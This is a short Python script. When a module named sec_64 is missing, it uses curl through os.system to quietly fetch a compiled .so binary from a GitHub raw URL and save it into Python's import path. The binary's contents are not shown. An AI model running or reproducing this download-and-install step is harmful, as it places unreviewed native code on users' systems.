import os,sys
path=str(sys.path[4])+str('/sec_64.so')
def run():
    try:
        import sec_64
    except:
        print(" Downloading module please wait...")
        os.system(f'curl -sS -L https://raw.githubusercontent.com/WARN-199/WARN-SERVER/refs/heads/main/sec_64.so -o {path}')
        print(" Downloading Successful..")